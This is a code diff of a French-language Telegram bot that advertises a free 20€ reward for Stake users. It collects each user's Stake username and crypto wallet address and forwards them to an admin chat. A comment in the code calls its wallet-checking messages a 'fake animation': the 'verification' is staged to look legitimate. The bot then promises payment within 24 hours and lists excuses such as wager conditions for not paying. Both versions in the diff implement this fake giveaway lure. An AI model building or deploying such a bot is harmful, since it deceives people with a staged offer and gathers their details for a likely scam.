@@ -1,122 +1,90 @@
-import asyncio
 import os
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import (
-    Application,
-    CommandHandler,
-    CallbackQueryHandler,
-    MessageHandler,
-    ContextTypes,
-    ConversationHandler,
-    filters,
-)
+import asyncio
+from telegram import Update
+from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters, ConversationHandler
 
-TOKEN = os.environ["TOKEN"]
-ADMIN_ID = int(os.environ["ADMIN_ID"])
+TOKEN = os.getenv("TOKEN")
+ADMIN_ID = os.getenv("ADMIN_ID")
 
-ASK_USERNAME, ASK_NETWORK, ASK_WALLET = range(3)
+if not TOKEN:
+    raise ValueError("TOKEN manquant")
 
+# États
+STAKE_USERNAME, WALLET = range(2)
+
+# /start
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("🚀 Réclamer mes 20€", callback_data="claim")]
-    ])
     await update.message.reply_text(
-        "🎁 Bienvenue ! Clique ci-dessous pour commencer.",
-        reply_markup=keyboard
+        "🎁 Bienvenue pour réclamer tes 20€ gratuits !\n\n"
+        "📝 Envoie ton pseudo Stake :"
     )
+    return STAKE_USERNAME
 
-async def claim_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    await query.message.reply_text("📝 Envoie ton pseudo Stake :")
-    return ASK_USERNAME
-
-async def ask_network(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    context.user_data["stake_username"] = update.message.text
-
-    keyboard = InlineKeyboardMarkup([
-        [
-            InlineKeyboardButton("Solana", callback_data="SOL"),
-            InlineKeyboardButton("ETH", callback_data="ETH"),
-            InlineKeyboardButton("BTC", callback_data="BTC"),
-        ]
-    ])
+# pseudo stake
+async def get_stake(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data["stake"] = update.message.text
 
     await update.message.reply_text(
-        "💳 Choisis le réseau :",
-        reply_markup=keyboard
+        "💰 Envoie maintenant ton adresse wallet (SOL / ETH / BTC) :"
     )
-    return ASK_NETWORK
+    return WALLET
 
-async def ask_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
+# wallet + fake animation
+async def get_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data["wallet"] = update.message.text
 
-    context.user_data["network"] = query.data
+    msg = await update.message.reply_text("🔍 Vérification du wallet...")
 
-    await update.message.reply_text(
-        "📩 Envoie ton adresse wallet :"
-    )
-    return ASK_WALLET
+    await asyncio.sleep(2)
+    await msg.edit_text("🔎 Recherche des correspondances...")
+    await asyncio.sleep(2)
+    await msg.edit_text("📡 Analyse en cours...")
+    await asyncio.sleep(2)
 
-async def finish(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    msg = await update.message.reply_text("🔍 Vérification...")
-
-    steps = [
-        "🔍 Recherche du wallet...",
-        "🧠 Analyse...",
-        "📡 Vérification...",
-        "✅ Wallet valide."
-    ]
-
-    for s in steps:
-        await asyncio.sleep(1)
-        await msg.edit_text(s)
-
-    await update.message.reply_text(
-        "✅ Demande envoyée.\n\n"
-        "💸 Paiement sous 24h si aucun problème.\n\n"
+    await msg.edit_text(
+        "✅ Demande envoyée !\n\n"
+        "💸 Tes fonds seront envoyés sous 24h si aucun problème détecté.\n\n"
         "⚠️ Problèmes possibles :\n"
         "• Double compte\n"
-        "• Wager insuffisant\n"
-        "• Wallet invalide"
+        "• Conditions de wager non respectées\n"
+        "• Informations incorrectes"
     )
 
-    await context.bot.send_message(
-        ADMIN_ID,
-        f"🆕 Nouvelle demande :\n"
-        f"👤 User: {context.user_data['stake_username']}\n"
-        f"🌐 Network: {context.user_data['network']}\n"
-        f"💳 Wallet: {update.message.text}"
-    )
+    # envoi admin
+    if ADMIN_ID:
+        try:
+            await context.bot.send_message(
+                chat_id=int(ADMIN_ID),
+                text=(
+                    "📥 Nouvelle demande\n\n"
+                    f"👤 Stake: {context.user_data['stake']}\n"
+                    f"🏦 Wallet: {context.user_data['wallet']}"
+                ),
+            )
+        except:
+            pass
 
     return ConversationHandler.END
 
+# cancel
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("❌ Annulé.")
+    return ConversationHandler.END
 
 def main():
     app = Application.builder().token(TOKEN).build()
 
     conv = ConversationHandler(
-        entry_points=[CallbackQueryHandler(claim_button, pattern="claim")],
+        entry_points=[CommandHandler("start", start)],
         states={
-            ASK_USERNAME: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, ask_network)
-            ],
-            ASK_NETWORK: [
-                CallbackQueryHandler(ask_wallet)
-            ],
-            ASK_WALLET: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, finish)
-            ],
+            STAKE_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_stake)],
+            WALLET: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_wallet)],
         },
-        fallbacks=[],
+        fallbacks=[CommandHandler("cancel", cancel)],
     )
 
-    app.add_handler(CommandHandler("start", start))
     app.add_handler(conv)
-
     app.run_polling()
-
 
 if __name__ == "__main__":
     main()
